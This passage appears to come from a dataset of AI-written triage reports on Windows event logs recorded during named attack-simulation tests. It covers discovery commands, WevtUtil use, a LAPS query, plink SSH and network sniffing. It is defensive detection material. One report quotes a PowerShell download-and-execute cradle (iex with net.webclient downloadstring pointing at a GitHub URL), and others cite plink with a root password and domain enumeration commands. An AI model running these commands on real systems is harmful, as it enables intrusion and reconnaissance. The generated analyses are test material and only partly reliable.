   - The PowerShell log entries show the registration of PowerShell providers like Registry, Alias, and Environment, which are standard operations during the initialization of PowerShell sessions. These logs do not show any execution of commands or scripts that could be considered suspicious or malicious.

3. **Security Logs:**
   - The time change events (Event ID 4616) from `svchost.exe` indicate a legitimate system process adjusting system time, which can happen during synchronization with time servers.
   - Multiple logins from a user `admin_test` are captured, using NTLM authentication from a known workstation (`DESKTOP-3HL5B2P`) with various elevated privileges. While privilege elevation and logins are recorded, they do not inherently suggest malicious activity. 
   - There are failed attempts to access credentials associated with a MicrosoftAccount:user or service, indicated by a return code of `3221226021`. This could be a failed authentication attempt but is not sufficient alone to conclude malicious activity.

4. **Sysmon Logs:**
   - The logs show execution of various system processes like `whoami`, `conhost`, `cmd`, and `net` commands which are common in Windows environments for checking current user information, and network views. 
   - The process `wsmprovhost.exe` (Windows Remote Management) with commands executed as part of supposed remote PowerShell sessions doesn’t show any overt signs of maliciousness from the provided information.
   - Windows system processes such as `wuauclt.exe` (Windows Update), `MpSigStub.exe` (Defender Update), and Edge update processes are recorded, indicative of routine system operations.

5. **Suspicious/Anomalous Detection:**
   - The anomaly lies primarily in the login behavior of the `admin_test` account, which might be attempting to access systems with elevated privileges. For complex environments, it is not unusual; however, the pattern and consistency of login activity could merit further review to ensure it aligns with expected user behavior.

### Overall Assessment:
- **Benign Activities:** Most of the events are routine Windows processes tied to system maintenance, updates, and normal user operations.
- **Areas Needing Further Context:** The frequent use of elevated privileges and failed credential checks should be cross-referenced with user behavior expectations to ensure they align with typical administrative tasks.

### Resolution:
- **Resolution: SUSPICIOUS**
  - While there is no immediate indication of a malicious compromise, the behavior around admin user access and unsuccessful credential access attempts needs further investigation and monitoring to ensure legitimacy.

### Guidance:
- **Investigate the `admin_test` Account:** Review the user’s access history and purpose to affirm legitimate use of privileges.
- **Review Networking and Access Patterns:** Confirm if remote accesses and NTLM authentication requests are expected for the external/networked accounts.
- **Monitor for Future Anomalies:** Keep watch on subsequent activities or unusual access attempts from accounts to catch potentially unfolding security incidents."
Enumerate logged on users via CMD (Local),"### Detailed Analysis

1. **Processes Executed:**
   - The logs show frequent executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`.
   - `wevtutil.exe` is a legitimate Windows utility for querying and managing event logs. Its execution may be legitimate if used by an administrator for monitoring purposes. However, frequent usage in batch indicates potential log tampering or other malicious purposes.
   - `conhost.exe` is a console window host, which is commonly seen alongside command-line execution but in these logs, it's consistently executed after `wevtutil.exe`. This pattern could suggest scripted or automated activities.

2. **Command-Line Arguments:**
   - A suspicious command `cmd.exe /c query user` is observed, though it was run under a highly privileged account (`High Integrity Level`). This indicates attempts to query user sessions, which could be for reconnaissance within the system.

3. **Parent-Child Process Relationships:**
   - The entry with `cmd.exe` parent process originating from `wsmprovhost.exe`, again confirms command execution with high privilege and interaction through a Windows service host.
   - Another notable instance is the execution of `whoami.exe`, used to display user information. This is also a common technique during the reconnaissance phase of an attack to confirm successful privilege acquisition.

4. **Microsoft EdgeUpdate Activity:**
   - Repeated execution of `MicrosoftEdgeUpdate.exe` and related processes are logged. The command parameters mostly relate to update tasks, which appear routine but require validation against update schedules to rule out masquerading or exploitation attempts.

5. **Security Log Events:**
   - Time change events (`EventID: 4616`) suggest system time alteration, which could be an indicator of tampering or attempts to obfuscate event timelines.

6. **Anomalous Timing:**
   - System time discrepancies (e.g., back-and-forth time changes) could hint at tampering, intentionally altering logs to cover tracks.
  
### Assessment

Given the elements presented:
- **Frequent use of system utilities** (`wevtutil.exe`, `cmd.exe`, `whoami.exe`) under an administrator context.
- **Parent-child process hierarchy** suggesting scripted activities, potentially anomalous behavior indicating possible unwanted behaviors.
- **Security time changes** can imply tampering or attempts to cover tracks.

### Resolution: **SUSPICIOUS**

The logs indicate activities warranting further investigation, particularly around the use of privileged accounts and system utilities that might be intended for malicious use or log manipulation. 

### Guidance on How to Proceed
1. **Deep Dive Investigation:**
   - Validate the necessity and authorization of `admin_test` user actions around `wevtutil.exe` and the time change events.
   - Investigate any scripts or scheduled tasks for operation logs involving `wevtutil.exe` and `conhost.exe`.

2. **Network and Endpoint Monitoring:**
   - Increase monitoring on the system for any unauthorized changes, particularly around user sessions and network connections.

3. **Cross-Verification with IT Operations:**
   - Confirm legitimate usage or abuse of user privileges, especially checking correlated user activities in other logs, such as network or external access patterns.

4. **Ensure Context Validity:**
   - Correlate these logs with application update schedules to confirm if `EdgeUpdate` actions align with legitimate update processes.

Following these steps will help evaluate the legitimacy of these activities and uncover any potential threats lurking in the environment."
MSFT Get-GPO Cmdlet,"After analyzing the provided Windows Sysmon and PowerShell logs, I have identified the following points of interest:

1. **Execution of Suspicious Processes:**
   - The execution of `DismHost.exe` from a temporary directory: ""C:\Users\ADMIN_~1\AppData\Local\Temp\D48C763E-E865-4B4D-ACE5-1BD1680CCD71\DismHost.exe"". This is unusual as legitimate system processes are expected to run from standard Windows directories like ""C:\Windows\System32\"".
   - Multiple instances of PowerShell execution are noted. One particular instance involves PowerShell command execution with `Get-GPO` exporting data to a local file. While this command isn't malicious by itself, it signals an attempt to gather domain policy information which could be part of reconnaissance activity when taken out of expected context.

2. **Frequent and Rapid Execution of System Utilities:**
   - Commands such as `wevtutil.exe` and `conhost.exe` are executed multiple times in succession. This could suggest an attempt to manipulate event logs or handle console outputs. The use of `wevtutil.exe` without further context can indicate potential log clearing.

3. **High Integrity Level Processes:**
   - Many processes are running with high integrity levels, indicating they have elevated privileges during their execution. Processes like PowerShell, `whoami.exe`, `hostname.exe`, and `DismHost.exe` were executed under an administrative context (SERVER002\admin_test).

4. **Microsoft Edge Related Updates:**
   - Several logs correspond to Microsoft Edge Update and Installer processes. While this might be legitimate, it’s vital to verify the legitimacy of these updates as it might indicate malicious mimicking of legitimate processes.

**Assessment & Resolution:**
- The execution of `DismHost.exe` from a temporary directory is highly unusual and indicative of potential unauthorized use or a malicious script. 
- The context of PowerShell usage for `Get-GPO` without clear intent or appropriate audit trail may suggest suspicious activity.
- The frequent use of commands like `wevtutil.exe` and `conhost.exe` may point to further suspicious actions.

**Final Resolution:** SUSPICIOUS

**Guidance:**
- Conduct a deeper investigation on the `DismHost.exe` found in the temporary directory. Verify its origin, creation time, and utilize anti-malware tools to assess it for known malicious signatures.
- Assess the context and necessity of the PowerShell command extracting group policy objects. Correlate it with user actions or administrative tasks.
- Review related system logs and security configurations to check for unauthorized privilege escalations or unsanctioned administrative actions.
- Examine network logs for any unusual connections originating from SERVER002 that coincide with the logs.
- Validate the Microsoft Edge updates, including hash verifications against known good versions, to ensure they are legitimate.
- Monitor `SERVER002` for any ongoing, unusual activity. Consider enhancing audit logging to capture command-line executions and user activity using Sysmon and other tools."
Enumerate Windows Security Log via WevtUtil,"Upon analyzing the provided Windows event logs, I've identified several key points that indicate potentially suspicious activity:

### Security Logs:
1. **Event ID 4616 & 4634**:
   - Event 4616 indicates that a time change occurred. Frequent or unexpected time changes can be suspicious, especially if they are not scheduled changes or if they occur without administrator knowledge.
   - Event 4634 denotes a user logoff event, which appears normal, but it's worth noting the associated logon event (ID 4624) that involves NTLM authentication, which could potentially indicate a lateral movement within a network if not expected.

2. **Event ID 4672 & 4624**:
   - Event 4672 indicates special privileges assigned to a new logon session (admin_test). The privileges include SeDebugPrivilege, which is commonly abused for malicious purposes like debugging and altering processes. This account should be monitored for any activities not aligning with regular user tasks.
   - Event 4624 logs successful logons using NTLM. While it can be legitimate, in a lateral movement or pass-the-hash attack it can be a suspicious sign.

### System Logs:
1. **Frequent Time Adjustments (Event ID 1)**:
   - Multiple immediate time adjustments by svchost.exe, around the same timestamp as the privileged operation. It might indicate an attempt to alter a proper audit trail if corroborated with other signs of tampering.

### Sysmon Logs:
1. **Process Creation With Elevated Privileges**:
   - Numerous instances of wevtutil.exe running under admin_test, which is usually used for managing event logs. This could mean an attempt to query or clear logs.
   - Execution of command-line tools and Windows sys-admin tools (`whoami.exe`, `cmd.exe`, `wevtutil`) from the account SERVER002\admin_test are concerning as they can be used to gather system information or alter logs maliciously.

2. **Host, Whoami, and Command Line Utility Usage**:
   - The repeated execution of administrative utilities such as `hostname.exe`, `whoami.exe`, and `cmd.exe` by admin_test also raises flags, particularly in a high-integrity context, suggesting an exploration attempt possibly by an unauthorized user.

### Application and Edge Update Activity:
1. **Microsoft Edge and Default Application Updates**:
   - The activities around EdgeUpdate.exe and application holiday events in process creation logs appear benign but should be cross-verified with policy regarding application update schedules.

### Conclusion:
The events from this analysis suggest activities that are suspicious but require further investigation. Specifically, the use of particular administrative privileges and tools can be indicative of exploratory or lateral movement behavior, common in reconnaissance phases of attacks.

### Resolution:
**SUSPICIOUS** - These logs contain activities that do not fit the regular patterns and roles expected of a user account. Further investigation is needed, ideally including:
- Verification of the legitimacy of actions by `admin_test`.
- Checking for scheduled time changes and verifying if they were authorized.
- Examination of network traffic and account authentications around the same time for anomalies.
- Implementation or review of advanced threat detection mechanisms, especially for privilege use.

The above observations indicate potential security incidents or improper usage scenarios; hence, investigation should be prioritized to ensure there is no active compromise or misalignment with established security protocols."

3. **Security Log Analysis:**
   - The events ID 5379 with the return code 3221226021, which translates to a status of ""STATUS_NOT_FOUND"", repeated multiple times indicate unsuccessful credential acquisition attempts. This could imply repeated attempts to access something that was not present or available.
   - Event ID 4624 and 4672 indicate successful logon with elevated privileges. However, since this is done by the SYSTEM account, it is not inherently malicious; rather, it’s typical for system processes and services maintenance.

4. **Windows PowerShell Log Analysis:**
   - The PowerShell command invocation includes `DirectorySearcher` which is used for querying directory services. This script appears to search for computer names. While it could be used for legitimate administrative tasks, its presence, especially if unexpected or unexplained, necessitates further review within the environment context.

5. **Sysmon Log Analysis:**
   - Several processes were initiated by the user `SERVER002\admin_test`, including PowerShell and `conhost.exe`. The script executed via PowerShell is identical to the one noted in the PowerShell logs, and it queries directory information.
   - Processes related to system updates and typical administrative tasks, like `wuauclt.exe` and `MpSigStub.exe`, were detected. These are expected during system updates.
   - The use of `wevtutil.exe` for querying or modifying event logs can be routine, but it may indicate log scrubbing or reconnaissance if executed unexpectedly by a user account.
   - The activity involving `MicrosoftEdgeUpdate.exe` and similar update executables is normal and expected as part of software update processes.

### Assessment and Resolution:
- The combination of multiple unsuccessful access attempts (Event ID 5379) and unexpected PowerShell execution deserves further examination to confirm if these were authorized actions.
- There is no clear indication of malicious activity given the context, but the behavior can be considered suspicious unless contextually justified by usual administrative operations.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed:
- Investigate the purpose and origin of the PowerShell script execution. Verify if it was an authorized administrative task.
- Conduct a detailed review of the `admin_test` user's activities around the logged timestamps to confirm if they align with expected behavior.
- Review security policies and logs on credential acquisition failures to determine if there is a misuse attempt.
- Enhance monitoring around PowerShell and credential access for early detection of potential misuse or threats."
Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope,"**Detailed Analysis:**

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - The logs include frequent occurrences of `wevtutil.exe` followed by `conhost.exe`, executed by `SERVER002\\admin_test`. The `wevtutil.exe` process is a legitimate Windows utility for managing event logs. However, repeated invocation in rapid succession might suggest an attempt to tamper with event logs or harvest log data without drawing attention.

2. **Execution of Recon Commands:**
   - The execution of `HOSTNAME.EXE` and `whoami.exe` is typically associated with network and user information enumeration, often a preliminary step of malicious activity to understand the environment context.

3. **PowerShell Execution with Unclear Command:**
   - A PowerShell process (`powershell.exe`) runs a script with a command resembling `{script -SearchScope subtree -filter \""name -like '*'\"" -Properties *}`, signifying an attempt to query large sets of information, possibly Active Directory objects or other resources. This is suspicious as querying all objects (`'*'`) is often unnecessary for routine tasks and could be indicative of reconnaissance or data collection.

4. **Normal System Activities:**
   - The presence of `svchost.exe` and system tasks regarding time synchronization and service management in the logs appear normal.

5. **Microsoft Edge Update:**
   - The execution of `MicrosoftEdgeUpdate.exe` as a scheduled task running under `NT AUTHORITY\SYSTEM` generally aligns with normal update activities for Edge browser-related components.

6. **Weak Indicators of Privilege Escalation or Execution of Malware:**
   - There are no strong indicators of privilege escalation or execution of known malicious processes based on the command lines and context provided.

**Assessment of Situation:**

While there are legitimate uses for each of the actions observed in the logs, the combination of frequent `wevtutil.exe` invocations, the use of recon commands like `whoami.exe`, and the PowerShell command targeting a broad filter can be suggestive of suspicious behavior indicative of an attempt to gather information for a potential attack. However, no definitive signs of malware execution or noticeable privilege escalation were evident from the provided logs.

**Resolution:**

- **SUSPICIOUS**: The activities align more closely with a reconnaissance phase rather than a direct compromise. As such, further investigation to confirm whether these commands are part of normal automated scripts, or indicative of a preparatory phase to more damaging activities, is warranted.

**Guidance on How to Proceed:**

- **Further Investigation:**
  - Conduct a thorough review of user `SERVER002\\admin_test` activities and permissions.
  - Verify any scripts or scheduled tasks that may be using `wevtutil.exe` and PowerShell to ensure they align with expected administrative or operational activities.
  - Check for any other activities during or after this period which could have resulted from this reconnaissance, focusing on access attempts or unusual network traffic.

- **Enhanced Monitoring:**
  - Implement enhanced monitoring on the affected host and similar systems to catch any follow-up activity.
  - Use SIEM solutions to flag unusual spikes in command-line utility usage or unusual patterns that deviate from typical baselines, especially those involving PowerShell and `wevtutil.exe`.

- **Security Controls:**
  - Consider tightening security controls and auditing over PowerShell usage and administrative tools to prevent potential misuse.
  - Regularly update and patch systems to minimize vulnerabilities that could be exploited after an initial reconnaissance phase."
Enumerate all accounts (Domain),"The provided log entries predominantly come from Sysmon, which records detailed information about process creations, network connections, and other security-relevant system activities. It captures a relatively small time window of events, focusing on process activities.

### Detailed Analysis:

1. **Regular Process Executions:**
   - There are multiple benign executions of Windows utility applications such as `whoami.exe`, `hostname.exe`, `cmd.exe`, `net.exe`, and `conhost.exe`. These are core Windows processes and are used for various legitimate purposes.
   - The invocation of these utilities by the user account `SERVER002\\admin_test` with a high integrity level can indicate routine administrative tasks. However, frequent uses of commands like `whoami`, which checks current user context, or `cmd.exe` with `net user` and `net group` commands are often worth examining further, as they could indicate reconnaissance or lateral movement.

2. **Command-Line Arguments:**
   - One potentially suspicious element is the sequence of `cmd.exe` processes executing `net user /domain` and `net group /domain`. This could indicate an attempt to gather information about the network and user accounts, which may be part of a benign system audit or malicious reconnaissance.

3. **Wevtutil Activity:**
   - The use of `wevtutil.exe`, which is a tool to retrieve information about event logs and publishers, can be indicative of typical administrative operations but could also point towards efforts to clear logs or modify log configurations if seen in context with other suspicious activities. Here, it seems like it may have been used benignly, assuming no deletion activities follow it.

4. **Microsoft Edge Update Activity:**
   - Activities related to the `MicrosoftEdgeUpdate.exe` and `setup.exe` suggest a routine update process for Microsoft Edge. The installation and execution paths and command-line arguments seen in these events are consistent with software updates.

5. **Unusual Administrative Activity:**
   - The combination of administrative commands performed from paths like the Temp directory is a red flag. While it's feasible that these actions could be related to scripted admin tasks, they could also indicate potentially malicious behavior, such as an attacker conducting reconnaissance under an admin account.

### Assessment of Logs:

Based on the logs provided, while there are no outright signs of obvious malware like unusual binaries or known malicious hashes, the use of system utilities like `cmd.exe` with network-related commands, especially executed in quick succession and originating from a Temp directory, is noteworthy and may be a part of suspicious behavior patterns.

### Resolution:

- **Resolution: SUSPICIOUS**

The activity indicates potential reconnaissance or unauthorized probing into user and group details, possibly by a legitimate user or an intruder using elevated privileges. These actions need additional context or corroborating logs to determine the intent, including checking user credential circulation, contextual investigations, and cross-referencing any other security incidents around the same timeline.

### Guidance:

- **Further Investigation Needed:**
  - Review user `admin_test` activities: Check historical activity logs for this user for any signs of abnormal behavior.
  - Validate Job Responsibilities: Verify if the observed behavior aligns with the user’s role or any authorized maintenance scripts/tasks.
  - Correlation with Other Logs: Check for any other abnormal activities or alerts triggered by security solutions in place around the same timestamps.
  - Conduct User Interviews: If not originated from an automated script, contact the user to verify the legitimacy of these actions.
- **Security Hardening:**
  - Implement stricter access controls and monitoring on high-privileged accounts.
  - Regularly review and audit account activities to catch potential malicious behavior early.

Final conclusion requires compiling additional contextual logs to understand the full activity scope around these events."
WinPwn - fruit,"### Analysis of Windows Event Logs

#### Suspicious Behavior Identified:
1. **PowerShell Script Execution**:
   - A PowerShell script was executed on the host with the intent to download and execute another script from the URL `https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`.
   - This script execution method, utilizing `iex(new-object net.webclient).downloadstring()`, is a common technique used in post-exploitation scenarios for downloading and executing scripts from the internet, potentially bypassing traditional defenses.

2. **Privileges and User Information**:
   - The account `admin_test` was logged in and was granted a set of high privileges (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege`), which could be indicative of privilege escalation or excessive privileges misuse.
   - The logon type `3` indicates a network logon, which may suggest remote access or automated processes depending on the context, but combined with script execution could be concerning.

3. **Sysmon Logs**:
   - Processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe` were executed by `SERVER002\admin_test`. While benign by themselves, their execution in close proximity to suspicious PowerShell script executions may indicate a reconnaissance or lateral movement attempt within the environment.

#### Indicators of Potential Malicious Activity:
- The downloaded and executed PowerShell script is concerning, especially because it was hosted on a potentially unverified GitHub repository. This is often associated with malware distribution, system compromise, or exploitation activities.
- The presence of `SeDebugPrivilege` and other high-level privileges while potentially executing such scripts could allow an attacker to manipulate system-level operations undetected.

### Assessment:
Given the identification of potentially malicious PowerShell activity, elevated privileges, and unexplained script download and execution from an external URL, the logs suggest potential malicious activity.

### Recommendation:
1. **Immediate Response**:
   - Isolate the machine if possible from the network to prevent further potential lateral movement.
   - Perform a full malware scan and memory analysis on the suspect machine to detect any active threats or malware.
   
2. **Further Investigation**:
   - Review related network logs to understand if there were successful connections to other potential malicious domains, especially surrounding the time frame of the PowerShell execution.
   - Conduct a thorough review of user activity, particularly focusing on who initiated the PowerShell scripts and the source responsible for the elevated privileges.

3. **Resolution**:
- **Resolution**: MALICIOUS  
  There is ample evidence pointing towards malicious activity characterized by unauthorized execution of scripts from untrusted sources and abuse of high-level system privileges.

Detailed analysis and a robust incident response plan are crucial to mitigating further risk and securing the network environment."
System Owner-User Discovery Using Command Prompt,"Upon analyzing the provided Windows event logs from different sources, let's break down activities and assess whether any malicious activity has occurred:

### 1. **System Log Analysis:**
- We observe entries related to Windows Update processes, particularly involving the Microsoft Defender Antivirus security intelligence updates. Such activities with Event IDs 44, 43, and 19 are customary for routine update procedures and do not indicate malicious behavior.

### 2. **Security Log Analysis:**
- Multiple entries with Event ID 5379 indicate Credential Validation failures related to MicrosoftAccount and WindowsLive services. The ReturnCode `3221226021` translates to a specific error in NTSTATUS codes implying the absence of credentials. It is often seen in various credential misalignment scenarios but can also be due to normal but unsuccessful credential checks on the system.

### 3. **Sysmon Log Analysis:**
- The Sysmon logs show multiple executions of usual Windows utilities such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`, `net.exe`, and `whoami.exe`. These could be indicative of investigative or script-driven actions. Of note is an event involving the `cmd.exe` being used to enumerate users and their sessions (`net users` and `query user`). This could be part of an administrative script or indicative of attempted reconnaissance within the system.
- The use of `cmd.exe` with commands that collect user information in a temporary file and list users and their sessions is not inherently malicious but suggests script-based monitoring or investigation. It raises some concern if unexpected, depending on the known usage patterns for the specific user or system.

### 4. **Application Log Analysis:**
- Entry indicating ""Windows Defender, SECURITY_PRODUCT_STATE_ON"" confirms Windows Defender is operational as a security measure on this system, which is normal.
 
### **Assessment and Resolution:**

Given the analysis:
- **System Logs**: Indicate regular security intelligence updates.
- **Security Logs**: Reflect credential validation errors; common and not necessarily suspicious.
- **Sysmon Logs**: Reveal the execution of system utilities including user reconnaissance commands but appear to be script-driven and do not inherently indicate malicious activity.
- **Application Logs**: Normal with Windows Defender operational.

**Resolution: SUSPICIOUS**

While most activities observed are characteristic of routine operations or maintenance scripts, the specific execution context behind the command for user and session enumeration suggests further investigation could be warranted. The activity may be benign if corroborated by known administrative tasks or routine scripts. Validate with system administrators regarding legitimate use of such commands to ensure there's no unauthorized script or user conducting reconnaissance actions. Further investigation can assure that the activity aligns with standard operational procedures."
List Open Egress Ports,"### Analysis of the Logs

#### Overview
The provided logs predominantly consist of Windows PowerShell, Sysmon, and Application logs. The analysis is aimed at identifying any suspicious, anomalous or outright malicious activity.

#### Observations from PowerShell Logs
- The primary activity noted is the execution of a PowerShell script that checks for open ports by attempting to connect to a domain (`allports.exposed`) and writing the results to a file (`open-ports.txt`).
- The script uses PowerShell to create a network socket connection to various ports, which is typical of port scanning behavior.

**Indicators:**
- The use of `new-object system.Net.Sockets.TcpClient` to attempt connections is not standard for benign user activity.
- The domain `allports.exposed` implies an intention to look for all open ports, possibly for reconnaissance purposes.

#### Observations from Sysmon Logs
- The Sysmon logs show multiple executions related to PowerShell and standard Windows utilities such as `conhost.exe`, `wevtutil.exe`, and `whoami.exe`.
- The multiple entries for `conhost.exe` and command-line utilities executed under the `admin_test` user context is not inherently suspicious by itself but should be considered in the context of other events.
- Notably, the PowerShell script maintains a high integrity level, which indicates elevated permissions.

**Indicators:**
- The presence of high integrity PowerShell executions aligned with port scanning activity, even under an admin account, indicates potentially suspicious behavior, likely intended for reconnaissance or unauthorized investigation of network configurations.

#### Observations from Application Logs
- A single event related to the Software Protection Platform Service. This appears to be routine and does not indicate any suspicious activity.

### Assessment
Based on the evidence gathered, the PowerShell activity seems to suggest reconnaissance and potential unauthorized port scanning:
- The use of a script to systematically check open ports on `allports.exposed` is indicative of a reconnaissance step, typically used in the early stages of a cyber attack.
- Utilizing PowerShell for these activities can be seen as an attempt to leverage its scripting capabilities for potentially malicious reconnaissance.

### Resolution
**Resolution: SUSPICIOUS**

### Recommendations for Further Actions
1. **Containment:**
   - Immediately restrict network access for the `admin_test` account on `Server002` and investigate the legitimacy of its activities.
   - Isolate `Server002` from sensitive parts of the network pending further investigation.

2. **Investigation:**
   - Verify the origin of the script—determine if it was executed manually by an administrator for legitimate purposes or if there is any indication of unauthorized usage.
   - Review additional logs for lateral movement or privilege escalation attempts.

3. **Prevention:**
   - Implement stricter PowerShell script execution policies, such as enforcing script signing.
   - Monitor network connections to suspicious domains (like `allports.exposed`) and block if necessary.

4. **Review Access:**
   - Conduct an audit of user permissions and administrative rights on `Server002` to prevent any unauthorized access.

5. **Alerting:**
   - Set up alerts for unusual PowerShell activity, especially those involving outbound connections or port scanning tools.

The activity within the logs warrants concern and necessitates a more detailed investigation to rule out or confirm malicious intent."
ESXi - Darkside system information discovery,"## Detailed Analysis of Logs:
Let's break down the provided logs to identify any suspicious or malicious activity.

### Sysmon Log:
1. **Execution of PowerShell**: 
   - The repeated execution of `powershell.exe` along with `wevtutil.exe` and `conhost.exe` by the user ""SERVER002\\admin_test"" from the `C:\\Windows\\System32` directory as seen in the initial logs may be indicative of unusual activity. PowerShell can be utilized both legitimately and for malicious purposes, but there are no command-line arguments captured that typically indicate it is being used maliciously.

2. **Use of Plink**:
   - Process 'plink.exe' is executed located at `C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles\plink.exe` with credentials provided, showcasing strings like `-l ""root""` and `-pw ""pass""`. This implies that Plink, which is a command-line SSH client bundled with PuTTY, is being used to connect to a remote system, which can be used for file transfers or command execution on remote systems.
   - This is highly unusual in a server environment unless explicitly allowed for administrators performing maintenance, audit, or debugging tasks. Authentication via plaintext passwords is a weak security practice.

3. **Hosts and Network Activities**:
   - No external IP connection or unusual internal communication patterns are shown explicitly in these event logs without networking event channels like Firewall or Windows Defender ATP logs to correlate them.

### Security Log:
1. **Logon Events (ID 4624/4672)**:
   - There is evidence of successful logon events with elevated privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.), which is standard for SYSTEM-level operations.

2. **User Enumeration (ID 4798)**:
   - These events indicate lists of user accounts on the system, usually requested by processes like `taskhostw.exe`. While this is a legitimate system process, knowing the context of these queries is essential for further investigation.

3. **Credential Validation Errors (ID 5379)**:
   - Errors related to Microsoft Account credential validations are logged multiple times without success. It is not inherently harmful unless traced to unauthorized credential harvesting or unauthorized systems attempting these validations.

### Application Log:
- EdgeUpdate-related activities seem benign, indicating regular update checks or installations attempts.

### Windows PowerShell Log:
- Unfortunately, there are no details from this channel, which would have been beneficial to understand PowerShell command execution context.

## Conclusion:
- **Suspicious Activity Identified:** The execution of `plink.exe` for SSH operations using credentials is suspicious, especially considering the password is in plaintext. This could indicate attempted unauthorized access or unexpected configuration from this particular machine.
- **Additional Correlation Needed:** Despite unusual PowerShell and plink.exe usage, without further log data (such as detailed PowerShell command line args or network traffic), a definitive attribution to malicious activity is challenging.

## Recommended Resolutions:
- **Resolution: SUSPICIOUS**
  - **Further Actions:**
    1. Investigate the purpose and authorize the use of plink.exe and verify SSH connections.
    2. Review PowerShell execution policies and command history on the server.
    3. Engage in network traffic analysis to assess any possible outbound connections that may occur without prior authorization.
    4. Monitor user behavior and ensure passwords are handled securely and changed if needed.
    5. Consider conducting an audit of admin-level processes and permissions to ensure no unsanctioned behavior is occurring.

Given the current set of logs, marking the resolution as ""SUSPICIOUS"" prompts the need for further investigation to either eliminate false positives or address potential security concerns."
PowerShell Network Sniffing,"After reviewing the provided logs, here is a detailed analysis of the activities observed:

1. **Sysmon Log Analysis:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` executed under the user ""SERVER002\admin_test.""
   - Instances of legitimate system tools like `wevtutil.exe` being executed may indicate an attempt to clear event logs, which is a known tactic used by attackers to cover their tracks.
   - Specific entries for `wevtutil.exe` (PID 5080, 4544, 4288) do not contain detailed command line arguments to definitively conclude if log clearing commands were used.
   - A PowerShell command (`powershell.exe`) was utilized to set up a network session capturing command (`New-NetEventSession`). This could be an indicator of a network monitoring or packet sniffing activity which might indicate reconnaissance or data exfiltration activities.

2. **Security Log Analysis:**
   - Log entries show a user ""admin_test"" with elevated privileges (EventID 4672), which includes SeDebugPrivilege and SeTakeOwnershipPrivilege. Possession of such privileges by a regular user account could potentially indicate a security risk if misused.
   - NTLM authentication was observed from a workstation named ""DESKTOP-3HL5B2P"" for the user ""admin_test,"" which might be normal unless context suggests otherwise.

3. **Application Log Analysis:**
   - Entry for the Software Protection Platform Service (EventID 16384) doesn't directly suggest any malicious activity on its own.

4. **Windows PowerShell Log Analysis:**
   - Consistent with Sysmon logs, PowerShell was used to execute capture-related commands. The command involves creating and manipulating a network event session, likely capturing and potentially analyzing network traffic. This activity, especially when unnecessary or unauthorized, could indicate suspicious behavior.

5. **System Log Analysis:**
   - Time adjustment events were observed, indicating that there were time changes on the system. While legitimate system processes (e.g., syncing with an NTP server) usually cause this, frequent or odd timing changes should be monitored further if continuing.

**Assessment:**

- **SUSPICIOUS**: There are indications of potentially suspicious behavior that warrant further investigation. The use of system tools like `wevtutil.exe`, combined with the execution of atypical PowerShell commands aimed at network capture, raises concerns about network monitoring, privilege misuse, or attempts to cover tracks by clearing logs.

**Recommendations:**

1. **Immediate Actions:**
   - Check for any unauthorized log clearing. Review the command history if available for `wevtutil.exe`.
   - Investigate the purpose and necessity of the PowerShell commands and network capture session to ensure they are legitimate and authorized actions.
   - Verify user ""admin_test"" requiring such elevated privileges and monitor this account closely for any unusual activities.

2. **Continued Monitoring:**
   - Regularly audit and review account privileges and usage logs.
   - Examine firewall and network logs to identify any unauthorized data flows that could relate to packet sniffing or data exfiltration attempts.

3. **Mitigation Measures:**
   - Implement stricter access controls and logging for sensitive operations and tool usage.
   - Enforce use of strong, multi-factor authentication methods where possible. 

This assessment concludes that although no direct malicious activity has been confirmed, the activities outlined indicate a potential security risk that must be explored further."
Find and Display Internet Explorer Browser Version,"### Detailed Analysis of the Logs

Upon analyzing the provided Windows event logs, several key observations can be made:

1. **Frequent Use of Wevtutil and Conhost**:
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` processes appearing sequentially within the logs. Wevtutil is a legitimate tool for managing event logs, and conhost is used for console operations. The repeated execution of these two processes in close succession might suggest an automated task or script execution.
   
2. **Execution of Hostname and Whoami**:
   - Processes `hostname.exe` and `whoami.exe` were executed. Both are legitimate Windows processes used to identify the system's hostname and the currently logged-in user, respectively. However, their execution might be part of reconnaissance activities if triggered by unauthorized users.

3. **Suspicious Registry Query via CMD**:
   - There is a command-line execution of `cmd.exe` with a subsequent `reg.exe` query command that checks Internet Explorer's version: `cmd.exe /c reg query ""HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer"" /v svcVersion`. This activity could imply an attempt to gather system information, potentially for exploitation purposes.

4. **System Time Modification**:
   - There are entries in the System and Security logs indicating a change in system time (`Event ID: 4616`). Altering system time can be a benign activity carried out by certain legitimate applications, but it can also be indicative of an attempt to cover tracks or alter log timestamps by malicious actors.

5. **High Integrity Level Processes**:
   - Many processes are executed with a high integrity level, which might be expected given that they are initiated by the `SERVER002\\admin_test` user. However, this reinforces the need to ensure that accounts with elevated privileges are not compromised.

6. **Absence of PowerShell Logs**:
   - Interestingly, there is no data in the PowerShell logs section. This could be normal if PowerShell wasn't utilized during this period, but PowerShell is often used for administrative or malicious scripts.

### Assessment

Given the analysis, the current set of logs shows a combination of potentially suspicious and benign activities:

- **Benign Activities**:
  - The usage of `wevtutil.exe` and `conhost.exe` can be explained as part of normal system logging and console operations.
  - Regular execution of `hostname.exe` and `whoami.exe` is part of general system interrogation.

- **Suspicious Activities**:
  - The command to query registry information related to Internet Explorer using `reg.exe` via `cmd.exe` seems unusual and might warrant a closer look, especially since it is executed by an admin account.
  - System time adjustments, despite potentially being a normal synchronization operation, should be evaluated against policy and expected behavior to rule out tampering.

### Resolution
The nature of the activities suggests they should be categorized under the **SUSPICIOUS** label. These actions, particularly the registry query and time adjustments, warrant further investigation to eliminate or confirm any malicious intent. It's recommended to:

